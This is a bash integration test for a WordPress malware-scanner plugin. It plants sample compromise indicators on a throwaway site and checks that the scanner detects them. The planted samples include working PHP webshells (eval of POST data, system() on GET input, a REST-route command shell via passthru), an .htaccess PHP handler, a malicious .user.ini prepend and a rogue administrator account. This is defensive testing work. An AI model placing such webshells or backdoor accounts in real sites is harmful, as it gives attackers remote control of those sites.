#!/usr/bin/env bash
#
# Integration tests against a real WordPress install.
#
#   tests/integration.sh /path/to/wordpress
#
# The site must already be installed with this plugin active, and `wp` (WP-CLI)
# must be on PATH (or set WP="php /path/wp-cli.phar"). The script plants inert
# text files that mimic attack indicators, so only run it on a throwaway site.
#
set -uo pipefail

SITE="${1:?usage: integration.sh /path/to/wordpress}"
WP="${WP:-wp} --path=$SITE --allow-root --skip-themes"
C="$SITE/wp-content"
FAIL=0
PASS=0

SECTION=""
section() { SECTION="$1"; echo "== $1 =="; }
ok()   { PASS=$((PASS+1)); echo "  ✓ $1"; }
bad()  {
	FAIL=$((FAIL+1)); echo "  ✗ $1"
	# On GitHub Actions, also raise an annotation (visible without signing in).
	[ -n "${GITHUB_ACTIONS:-}" ] && echo "::error title=Integration test failed::$SECTION — $1"
	return 0
}

# A scan's JSON. Every assertion first checks the scan really produced a report,
# so a crashed scan can't make "hasn't found X" assertions pass by accident.
scan() { $WP php2shell scan --skip-core --format=json --min=info "$@" 2>/dev/null; }
valid() { echo "$1" | jq -e '.verdict and (.findings | type == "array")' >/dev/null 2>&1; }
has() {   # has <json> <jq filter> <label>
	if ! valid "$1"; then bad "$3 (scan produced no report)"; return; fi
	if echo "$1" | jq -e "$2" >/dev/null 2>&1; then ok "$3"; else bad "$3"; fi
}
hasnt() {
	if ! valid "$1"; then bad "$3 (scan produced no report)"; return; fi
	if echo "$1" | jq -e "$2" >/dev/null 2>&1; then bad "$3"; else ok "$3"; fi
}
msg() { echo "[.findings[] | select(.message | test(\"$1\"; \"i\"))] | length > 0"; }
sev() { echo "[.findings[] | select(.severity == \"$1\" and (.message | test(\"$2\"; \"i\")))] | length > 0"; }

# Pretend the website runs this PHP (what the dashboard would record).
set_php() { # set_php <version> [extra] [os] [memory_limit] [history-json]
	$WP eval "update_site_option( 'wp2ss_env', array(
		'version' => '$1', 'extra' => '${2:-}', 'branch' => implode( '.', array_slice( explode( '.', '$1' ), 0, 2 ) ),
		'sapi' => 'fpm-fcgi', 'os' => '${3:-linux}', 'server' => 'nginx', 'upload_progress' => '1',
		'memory_limit' => '${4:-256M}', 'fatal_bt' => '0', 'error_log' => '', 'time' => time(),
		'history' => json_decode( '${5:-[]}', true ) ) );" >/dev/null 2>&1
}

set_php 8.3.36   # A patched PHP for the baseline tests.

section "1. Clean site"
R=$(scan)
has   "$R" '.verdict' "scan returns a verdict"
if echo "$R" | jq -e '[.findings[] | select(.type=="version" and .severity!="info")] | length > 0' >/dev/null; then
	has "$R" '.verdict == "VULNERABLE"' "unpatched clean site is VULNERABLE (not COMPROMISED)"
	$WP php2shell scan --skip-core --format=summary >/dev/null 2>&1; CODE=$?
	[ "$CODE" = "1" ] && ok "exit code 1 when vulnerable" || bad "exit code was $CODE, expected 1"
else
	has "$R" '.verdict == "CLEAN" or .verdict == "REVIEW"' "patched clean site is CLEAN/REVIEW"
fi
hasnt "$R" '[.findings[] | select((.severity=="critical" or .severity=="high") and .type!="version")] | length > 0' "no high/critical findings on a clean install"
hasnt "$R" '[.findings[] | select(.message | test("Scanner"; "i"))] | length > 0' "scanner doesn't flag itself"
hasnt "$R" "$(msg 'Theme \"index.php\"')" "a loose themes/index.php isn't mistaken for a theme"
has   "$R" "$(sev info 'PHP 8.3.36 includes the PHP2Shell fix')" "patched PHP is reported as fixed"

section "2. False-positive bait"
mkdir -p "$C/uploads/2026/08" "$C/cache/wp-rocket/example.com" "$C/plugins/performance-lab" "$C/upgrade-temp-backup/plugins/akismet"
printf '<?php\n// Silence is golden.\n' > "$C/uploads/index.php"
printf '<?php /* nothing here */ ?>\n' > "$C/uploads/2026/08/index.php"
printf '<?php $cache = array(); return $cache;\n' > "$C/cache/wp-rocket/example.com/index-https.php"
printf '<?php\n/**\n * Plugin Name: Performance Lab\n * Author: WordPress Performance Team\n */\n' > "$C/plugins/performance-lab/load.php"
printf '<?php\n/* Plugin Name: Akismet */\n' > "$C/upgrade-temp-backup/plugins/akismet/akismet.php"
printf '<?php\n// Drop-in\n$x = 1;\n' > "$C/object-cache.php"
printf '# BEGIN Wordfence code execution protection\n<IfModule mod_php5.c>\nphp_flag engine 0\n</IfModule>\nAddHandler cgi-script .php .phtml .php3 .pl .py .jsp .asp .htm .shtml .sh .cgi\nOptions -ExecCGI\n# END Wordfence\n' > "$C/uploads/.htaccess"
printf 'auto_prepend_file = "%s/wordfence-waf.php"\n' "$SITE" > "$SITE/.user.ini"
R=$(scan)
hasnt "$R" "$(msg 'uploads/index.php')" "'Silence is golden' index.php in uploads is not flagged"
hasnt "$R" "$(msg 'wp-rocket')" "cache-plugin PHP is not flagged"
hasnt "$R" '[.findings[] | select((.severity=="critical" or .severity=="high") and (.message|test("Performance")))] | length > 0' "official Performance Lab plugin is not flagged"
hasnt "$R" "$(msg 'upgrade-temp-backup')" "WordPress's update backup folder is not flagged"
hasnt "$R" "$(msg 'object-cache.php')" "object-cache.php drop-in is not flagged"
hasnt "$R" "$(msg 'htaccess')" "Wordfence's protective uploads .htaccess is not flagged"
hasnt "$R" "$(msg 'before every page')" "Wordfence's auto_prepend_file is not flagged"
rm -rf "$C/plugins/performance-lab" "$C/upgrade-temp-backup" "$C/object-cache.php" "$C/uploads/.htaccess" "$SITE/.user.ini"

section "3. wp2shell indicators"
mkdir -p "$C/plugins/wp2shell_6a5566a6" "$C/plugins/gg-helper" "$C/upgrade/wp2shell_79b06a80" "$C/plugins/cmsmap" "$C/uploads/2026/07"
printf '<?php\n/* Plugin Name: wp2shell_6a5566a6 */\n' > "$C/plugins/wp2shell_6a5566a6/wp2shell_6a5566a6.php"
printf '<?php\n/* Plugin Name: CMSmap */\n' > "$C/plugins/cmsmap/cmsmap.php"
printf "<?php\neval(\$_POST['k']??'http_response_code(404);');\n" > "$C/cache/x.php"
printf "<?php\n/* Plugin Name: gg-helper */\nadd_action('rest_api_init',function(){register_rest_route('morning/v1','/z',array('methods'=>'POST','permission_callback'=>function(){return true;},'callback'=>function(\$r){ob_start();passthru(base64_decode(\$r->get_param('c')).' 2>&1');return ob_get_clean();}));});\n" > "$C/plugins/gg-helper/gg-helper.php"
printf "<?php eval(gzuncompress(base64_decode('AAAA')));\n" > "$C/uploads/2026/07/img.php"
printf 'AddHandler application/x-httpd-php .jpg\n' > "$C/uploads/.htaccess"
printf '<?php echo 1;\n' > "$C/themes/.hidden.php"
touch "$C/temp-write-test-123" "$C/uploads/wp2shell_6a5566a6.zip"
$WP plugin activate gg-helper --quiet
$WP user create backdoor bd@evil.test --role=administrator --quiet >/dev/null 2>&1
$WP eval 'global $wpdb; $wpdb->update($wpdb->users, array("user_registered"=>gmdate("Y-m-d H:i:s", time()+7200)), array("user_login"=>"backdoor"));'

LOG=$(mktemp)
cat > "$LOG" <<'EOF'
1.2.3.4 - - [18/Jul/2026:10:00:00 +0000] "POST /?rest_route=%2Fbatch%2Fv1 HTTP/1.1" 207 512 "-" "wp2shell"
34.81.132.62 - - [18/Jul/2026:10:00:05 +0000] "GET /wp-json/wp/v2/users?context=edit HTTP/1.1" 200 10 "-" "Mozilla/5.0"
34.81.132.62 - - [18/Jul/2026:10:00:09 +0000] "POST /wp-admin/update.php?action=upload-plugin HTTP/1.1" 302 0 "-" "Mozilla/5.0"
EOF

R=$(scan --log="$LOG")
has "$R" '.verdict == "COMPROMISED"'           "verdict is COMPROMISED"
has "$R" "$(msg 'wp2shell exploit.s naming')"   "wp2shell_<hex> plugin"
has "$R" "$(msg 'CMSmap')"                      "CMSmap plugin"
has "$R" "$(msg 'hides behind a 404')"          "404 eval one-liner in cache/"
has "$R" "$(sev critical 'gg-helper/gg-helper.php')" "REST command shell (even with a closure permission_callback)"
has "$R" "$(msg 'namespace .morning/v1')"       "morning/v1 namespace registered"
has "$R" "$(msg 'gg-. prefix')"                 "gg- plugin name"
has "$R" "$(msg 'Packed/obfuscated')"           "packed eval in uploads"
has "$R" "$(sev high 'PHP file in a data folder.*uploads/2026/07/img.php')" "recent PHP in uploads is high"
has "$R" "$(msg 'htaccess makes PHP executable')" ".htaccess PHP handler in uploads"
has "$R" "$(msg 'Hidden PHP file')"             "hidden PHP file"
has "$R" "$(msg 'Write-test file')"             "temp-write-test probe"
has "$R" "$(msg 'plugin archive')"              "wp2shell_*.zip"
has "$R" "$(msg 'staging folder')"              "upgrade/wp2shell_<hex> folder"
has "$R" '[.findings[] | select(.type=="user" and .severity=="high" and (.message|test("backdoor")))] | length > 0' "rogue admin is high"
has "$R" '[.findings[] | select(.type=="user" and (.message|test("set up")))] | length > 0' "original admin recognised as site setup"
has "$R" "$(msg 'successful .200/207. requests to the WordPress batch API')" "log: URL-encoded batch API hit"
has "$R" "$(msg 'exploit tools')"               "log: tool user-agent"
has "$R" "$(msg 'attacker IPs')"                "log: attacker IP"
has "$R" "$(msg 'plugin-upload')"               "log: plugin upload"
has "$R" "$(msg 'user-enumeration')"            "log: user enumeration"

section "4. Resumable scanning (tiny time slices)"
# Enough files that even a fast machine needs many slices.
mkdir -p "$C/uploads/slices"
for d in $(seq 1 40); do mkdir -p "$C/uploads/slices/$d"; for f in $(seq 1 75); do : > "$C/uploads/slices/$d/f$f.txt"; done; done
FULL=$(echo "$R" | jq '[.findings[] | select(.type!="log")] | length')
SLICED=$($WP eval '
	WP2SS_Scanner::start( array( "core" => false, "log" => "" ), "test", true );
	$steps = 0;
	do { $r = WP2SS_Scanner::step( 0.0005 ); $steps++; } while ( is_array( $r ) && empty( $r["verdict"] ) && $steps < 200000 );
	echo $steps, " ", count( array_filter( $r["findings"], function ( $f ) { return "log" !== $f["type"] && "scan" !== $f["type"]; } ) );
' 2>/dev/null)
FULLNS=$(echo "$R" | jq '[.findings[] | select(.type!="log" and .type!="scan")] | length')
STEPS=${SLICED%% *}; COUNT=${SLICED##* }
[ "${STEPS:-0}" -gt 5 ] && ok "scan resumed across $STEPS slices" || bad "scan did not split into slices ($SLICED)"
[ "$COUNT" = "$FULLNS" ] && ok "sliced scan found the same $COUNT findings" || bad "sliced scan found $COUNT, full scan $FULLNS"
rm -rf "$C/uploads/slices"

section "5. Ignore list & exit codes"
$WP php2shell scan --skip-core --format=summary >/dev/null 2>&1; CODE=$?
[ "$CODE" = "2" ] && ok "exit code 2 when compromised" || bad "exit code was $CODE, expected 2"
$WP wp2shell status --format=json >/dev/null 2>&1 && ok "old 'wp wp2shell' command still works" || bad "'wp wp2shell' alias missing"
ID=$(echo "$R" | jq -r '[.findings[] | select(.message|test("Hidden PHP"))][0].id')
$WP php2shell ignore "$ID" >/dev/null
R2=$(scan)
hasnt "$R2" "[.findings[] | select(.id==\"$ID\")] | length > 0" "ignored finding is hidden"
printf '<?php echo 2;\n' > "$C/themes/.hidden.php"
R2=$(scan)
has "$R2" "[.findings[] | select(.id==\"$ID\")] | length > 0" "…but comes back when the file changes"
$WP php2shell ignore "$ID" --undo >/dev/null
# An attacker with database access forges an ignore entry: it must not work.
FID=$(echo "$R" | jq -r '[.findings[] | select(.message|test("hides behind a 404"))][0].id')
$WP eval "update_site_option( 'wp2ss_ignored', array( '$FID' => array( 'sha1' => '', 'sig' => str_repeat( 'a', 64 ), 'by' => 0, 'at' => time() ) ) );" >/dev/null
R2=$(scan)
has "$R2" "[.findings[] | select(.id==\"$FID\")] | length > 0" "forged ignore entry (no valid signature) is rejected"
$WP eval "delete_site_option( 'wp2ss_ignored' );" >/dev/null
has "$($WP php2shell status --format=json 2>/dev/null)" '.verdict' "status command works"

section "6. Evasion & blind spots"
SELF=$($WP eval 'echo untrailingslashit( WP2SS_DIR );' 2>/dev/null)
OUTSIDE=$(mktemp -d)
printf "<?php @eval(\$_REQUEST['z']);\n" > "$SELF/includes/class-helper.php"
mkdir -p "$OUTSIDE/linked-plugin" && printf "<?php eval(\$_POST['q']);\n" > "$OUTSIDE/linked-plugin/x.php"
ln -s "$OUTSIDE/linked-plugin" "$C/plugins/linked-plugin"
ln -s "$C/plugins" "$C/plugins/linked-plugin-loop" 2>/dev/null
mkdir -p "$C/plugins/padded"
{ printf '<?php\n/* Plugin Name: padded */\n'; head -c 6000000 /dev/zero | tr '\0' ' '; printf "\neval(\$_POST['p']);\n"; } > "$C/plugins/padded/padded.php"
printf "<?php \$f=\${'_P'.'OST'}; \$f['a'](\$f['b']);\n" > "$C/plugins/padded/split.php"
printf "<?php eval(base64_decode('%s'));\n" "$(head -c 900 /dev/urandom | base64 -w0)" > "$C/plugins/padded/blob.php"
printf "<?php system(\$_GET['c']);\n" > "$C/plugins/padded/sys.php"
printf "<?php \$_GET['f'](\$_GET['a']);\n" > "$C/plugins/padded/dyn.php"
printf "<?php include 'favicon.ico';\n" > "$C/plugins/padded/ico.php"
BAD=$(printf 'bad\xff\xfename')
mkdir -p "$C/uploads/$BAD" && printf "<?php eval(\$_POST['u']);\n" > "$C/uploads/$BAD/shell.php"
{ printf '\x89PNG\r\n\x1a\n'; printf "<?php eval(\$_POST['i']); ?>"; } > "$C/uploads/2026/07/photo.png"
R=$(scan)
has "$R" "$(msg 'own folder: includes/class-helper.php')" "PHP planted inside the scanner's own folder"
has "$R" "$(msg 'linked-plugin/x.php')"            "webshell in a symlinked plugin folder"
has "$R" '.stats.links >= 1'                        "symlink loop not followed"
has "$R" "$(msg 'padded/padded.php')"              "payload at the end of a >5 MB file"
has "$R" "$(msg 'splitting its name.*split.php')"  "split \$_POST name"
has "$R" "$(msg 'hidden .base64. payload.*blob.php')" "large base64 eval payload"
has "$R" "$(sev critical 'shell commands taken from a web request.*sys.php')" "system(\$_GET[…])"
has "$R" "$(msg 'function whose name comes from a web request.*dyn.php')" "\$_GET['f'](…)"
has "$R" "$(msg 'image file as PHP.*ico.php')"     "include of an image file"
has "$R" "$(msg 'shell.php')"                       "webshell under a non-UTF-8 folder name (scan didn't stall)"
has "$R" "$(msg 'Image file contains PHP code')"   "PHP hidden inside an uploaded image"
rm -f "$SELF/includes/class-helper.php" "$C/plugins/linked-plugin" "$C/plugins/linked-plugin-loop" "$C/uploads/2026/07/photo.png"
rm -rf "$OUTSIDE" "$C/plugins/padded" "$C/uploads/$BAD"

section "7. Host files, site root & stable IDs"
mkdir -p "$C/mu-plugins"
printf '<?php // host\n' > "$C/mu-plugins/kinsta-mu-plugins.php"
printf '<?php // ?\n' > "$C/mu-plugins/zz-unknown.php"
printf '<?php echo 1;\n' > "$C/zz-dropped.php"
printf '<?php echo 1;\n' > "$SITE/.cache.php"
printf 'auto_prepend_file = /tmp/evil.php\n' > "$SITE/.user.ini"
printf '<?php\ndefined( "ABSPATH" ) || exit;\n$a = 1;\n' > "$C/uploads/guarded.php"
touch -d '2024-01-01' "$C/uploads/guarded.php"
R=$(scan)
has "$R" '[.findings[] | select(.type=="mu-plugin" and .severity=="low" and (.message|test("kinsta")))] | length > 0' "known host mu-plugin is only low"
has "$R" '[.findings[] | select(.type=="mu-plugin" and .severity=="medium" and (.message|test("zz-unknown")))] | length > 0' "unknown mu-plugin is medium"
has "$R" "$(sev high 'directly in wp-content.*zz-dropped.php')" "unknown PHP loose in wp-content"
has "$R" "$(sev high 'Hidden PHP file in the site root')" "hidden PHP in the site root"
has "$R" "$(sev high 'user.ini makes PHP run ./tmp/evil.php')" "malicious auto_prepend_file in .user.ini"
has "$R" "$(sev low 'guarded.php')"               "old, ABSPATH-guarded PHP in uploads is only low"
ID=$(echo "$R" | jq -r '[.findings[] | select(.message|test("zz-unknown"))][0].id')
$WP php2shell ignore "$ID" >/dev/null
touch -d '2026-09-01 12:00' "$C/mu-plugins/zz-unknown.php"
R=$(scan)
hasnt "$R" "$(msg 'zz-unknown')" "ignored finding stays ignored when only its date changes"
$WP php2shell ignore "$ID" --undo >/dev/null
rm -f "$C/mu-plugins/kinsta-mu-plugins.php" "$C/mu-plugins/zz-unknown.php" "$C/zz-dropped.php" "$SITE/.cache.php" "$SITE/.user.ini" "$C/uploads/guarded.php"

section "8. Users & roles"
$WP user create olduser old@test.local --role=subscriber --quiet >/dev/null 2>&1
$WP eval 'global $wpdb; $wpdb->update($wpdb->users, array("user_registered"=>"2020-01-01 00:00:00"), array("user_login"=>"olduser"));'
scan >/dev/null                                    # saves the admin baseline
$WP user set-role olduser administrator --quiet >/dev/null 2>&1
$WP eval '$r = get_role( "editor" ); $r->add_cap( "install_plugins" );' >/dev/null
R=$(scan)
has "$R" "$(sev high 'Existing account .olduser. .* became an administrator')" "old (or backdated) account promoted to admin"
has "$R" "$(sev medium 'role has administrator powers: install_plugins')" "editor role given install_plugins"
$WP eval '$b = get_site_option( "wp2ss_admins" ); $b["ids"][] = 999; update_site_option( "wp2ss_admins", $b );' >/dev/null
R=$(scan)
has "$R" "$(sev high 'saved list of administrators was changed')" "tampered admin baseline is detected"
$WP eval '$r = get_role( "editor" ); $r->remove_cap( "install_plugins" );' >/dev/null
$WP user delete olduser --yes --quiet

section "9. Locking, pauses & cancellation"
OUT=$($WP eval '
	global $wpdb;
	WP2SS_Scanner::start( array( "core" => false ), "test", true );
	$t = is_multisite() ? $wpdb->get_blog_prefix( get_main_site_id() ) . "options" : $wpdb->options;
	$wpdb->query( $wpdb->prepare( "INSERT INTO `$t` (option_name, option_value, autoload) VALUES (%s, %s, %s)", "wp2ss_lock", time() . "|other", "no" ) );
	$a = WP2SS_Scanner::step( 1 );
	echo empty( $a["busy"] ) ? "nobusy" : "busy", " ";
	$wpdb->query( $wpdb->prepare( "UPDATE `$t` SET option_value = %s WHERE option_name = %s", ( time() - 3600 ) . "|dead", "wp2ss_lock" ) );
	$job = get_site_option( "wp2ss_job" ); $job["updated"] = time() - 3 * HOUR_IN_SECONDS; update_site_option( "wp2ss_job", $job );
	do { $b = WP2SS_Scanner::step( 5 ); } while ( is_array( $b ) && empty( $b["verdict"] ) && empty( $b["busy"] ) );
	echo empty( $b["verdict"] ) ? "unfinished" : "finished", " ";
	echo $wpdb->get_var( $wpdb->prepare( "SELECT COUNT(*) FROM `$t` WHERE option_name = %s", "wp2ss_lock" ) );
' 2>&1)
[ "${OUT%% *}" = "busy" ] && ok "a second request waits while another holds the lock" || bad "lock not respected ($OUT)"
echo "$OUT" | grep -q "finished 0$" && ok "stale lock recovered, paused scan resumed and finished, lock released" || bad "stale lock / resume failed ($OUT)"
OUT=$($WP eval '
	WP2SS_Scanner::start( array( "core" => false ), "test", true );
	WP2SS_Scanner::step( 0.002 );
	WP2SS_Scanner::cancel();
	echo null === WP2SS_Scanner::step( 1 ) && null === WP2SS_Scanner::current() ? "gone" : "back";
' 2>&1)
[ "$OUT" = "gone" ] && ok "a cancelled scan stays cancelled" || bad "cancelled scan came back ($OUT)"

section "10. Error isolation"
cat > "$C/mu-plugins/wp2ss-test-break.php" <<'EOF'
<?php
add_action( 'rest_api_init', function () { throw new RuntimeException( 'simulated crash' ); } );
EOF
R=$(scan)
has "$R" '.verdict' "scan still completes when a check crashes"
has "$R" "$(msg 'stopped early')" "the crash is reported as a finding"
rm -f "$C/mu-plugins/wp2ss-test-break.php"

section "11. WordPress version edge cases"
cat > "$C/mu-plugins/wp2ss-test-version.php" <<'EOF'
<?php $GLOBALS['wp_version'] = '7.0';
EOF
R=$(scan)
has "$R" "$(sev critical 'WordPress 7.0 is vulnerable')" "WordPress \"7.0\" (no .0 suffix) is detected as vulnerable"
rm -f "$C/mu-plugins/wp2ss-test-version.php"

section "12. PHP2Shell: PHP versions"
set_php 8.3.10
R=$(scan)
has "$R" "$(sev high 'PHP 8.3.10 is vulnerable to PHP2Shell')" "8.3.10 (plain upstream build) is vulnerable"
has "$R" '.verdict == "VULNERABLE" or .verdict == "SUSPICIOUS" or .verdict == "COMPROMISED"' "vulnerable PHP raises the verdict"
has "$R" "$(msg 'Temporary PHP2Shell protections.*upload_progress')" "missing stopgap settings are listed"
set_php 8.1.2-1ubuntu2.20 -1ubuntu2.20 ubuntu
R=$(scan)
has "$R" "$(sev medium 'PHP 8.1.2-1ubuntu2.20 has no official PHP2Shell fix')" "Ubuntu-packaged 8.1 is 'ask your host', not a hard fail"
set_php 8.0.30
R=$(scan)
has "$R" "$(sev high 'PHP 8.0.30 has no official PHP2Shell fix')" "8.0 (source backports only) is high"
set_php 7.3.33
R=$(scan)
has "$R" "$(sev critical 'PHP 7.3.33 will never get a PHP2Shell fix')" "7.3 has no fix at all"
hasnt "$R" '.verdict == "COMPROMISED" and ([.findings[] | select(.severity=="critical" and .type!="php")] | length == 0)' "an old PHP alone never reads as COMPROMISED"
set_php 8.5.12
R=$(scan)
has "$R" "$(sev info 'PHP 8.5.12 includes the PHP2Shell fix')" "8.5.12 is fixed"
set_php 8.4.27 "" linux 256M "[{\"v\":\"8.4.20\",\"extra\":\"\",\"sapi\":\"fpm-fcgi\",\"first\":1790000000,\"last\":$(date +%s)}]"
R=$(scan)
has "$R" "$(sev medium 'ran PHP 8.4.20 .not patched for PHP2Shell. until')" "recently-unpatched PHP history prompts credential rotation"

section "13. PHP2Shell: log evidence"
set_php 8.3.36
ERR=$(mktemp)
for i in 1 2 3 4 5 6; do echo "[21-Oct-2026 08:0$i:00 UTC] PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 65536 bytes) in Unknown on line 0" >> "$ERR"; done
echo "[21-Oct-2026 08:10:00 UTC] PHP Warning:  session_start(): Failed to decode session object. Session has been destroyed in Unknown on line 0" >> "$ERR"
echo "[21-Oct-2026 08:11:00 UTC] PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted in /var/www/wp-includes/class-wp.php on line 12" >> "$ERR"
echo "[01-Sep-2026 08:00:00 UTC] PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted in Unknown on line 0" >> "$ERR"
ACC=$(mktemp)
for i in $(seq 1 25); do echo "6.6.6.6 - - [21/Oct/2026:09:00:$(printf %02d $i) +0000] \"POST / HTTP/1.1\" 500 0 \"-\" \"x\"" >> "$ACC"; done
for i in $(seq 1 25); do echo "7.7.7.7 - - [10/Oct/2026:09:00:$(printf %02d $i) +0000] \"POST / HTTP/1.1\" 500 0 \"-\" \"x\"" >> "$ACC"; done
R=$(scan --error-log="$ERR" --log="$ACC")
has   "$R" "$(sev high '^6 out-of-memory errors raised before any script ran')" "burst of 'in Unknown on line 0' OOMs since Oct 17 is high (older one not counted)"
has   "$R" "$(sev medium 'Failed to decode session object')" "session decode failure"
has   "$R" "$(msg 'crashed PHP.*6.6.6.6 .25.')" "POST/500 burst from one IP since Oct 17"
hasnt "$R" "$(msg '7.7.7.7')" "POST/500 burst before Oct 17 ignored"
set_php 8.3.36 "" linux -1
R=$(scan --error-log="$ERR")
has   "$R" "$(sev high 'out-of-memory errors since October 17, 2026 even though memory_limit is -1')" "OOM despite memory_limit=-1 is flagged"
gzip -c "$ERR" > "$ERR.gz"
R=$(scan --error-log="$ERR.gz")
has   "$R" "$(msg 'out-of-memory errors raised before any script ran')" "compressed (.gz) error log works"
rm -f "$ERR" "$ERR.gz" "$ACC"
set_php 8.3.36

section "14. Own-file integrity (release manifest)"
php "$(dirname "$0")/../.github/scripts/make-manifest.php" "$SELF" 9.9.9 2>/dev/null
R=$(scan)
hasnt "$R" "$(msg 'scanner plugin has been modified')" "untouched plugin files pass the manifest check"
cp "$SELF/includes/class-settings.php" "$OUTSIDE.bak" 2>/dev/null || cp "$SELF/includes/class-settings.php" /tmp/wp2ss-settings.bak
echo "// tampered" >> "$SELF/includes/class-settings.php"
R=$(scan)
has "$R" "$(sev critical 'scanner plugin has been modified: includes/class-settings.php')" "a tampered plugin file is critical"
cp "$OUTSIDE.bak" "$SELF/includes/class-settings.php" 2>/dev/null || cp /tmp/wp2ss-settings.bak "$SELF/includes/class-settings.php"
rm -f "$SELF/manifest.json" "$OUTSIDE.bak" /tmp/wp2ss-settings.bak

section "15. Cleanup → clean again"
rm -rf "$C/plugins/wp2shell_6a5566a6" "$C/plugins/cmsmap" "$C/upgrade/wp2shell_79b06a80" \
	"$C/cache/x.php" "$C/uploads/2026/07/img.php" "$C/uploads/.htaccess" "$C/themes/.hidden.php" \
	"$C/temp-write-test-123" "$C/uploads/wp2shell_6a5566a6.zip"
$WP plugin deactivate gg-helper --quiet; rm -rf "$C/plugins/gg-helper"
$WP user delete backdoor --yes --quiet
R=$(scan)
hasnt "$R" '[.findings[] | select((.severity=="critical" or .severity=="high") and .type!="version")] | length > 0' "no high/critical findings after cleanup"
rm -f "$LOG"

echo
echo "$PASS passed, $FAIL failed"
[ "$FAIL" = 0 ]
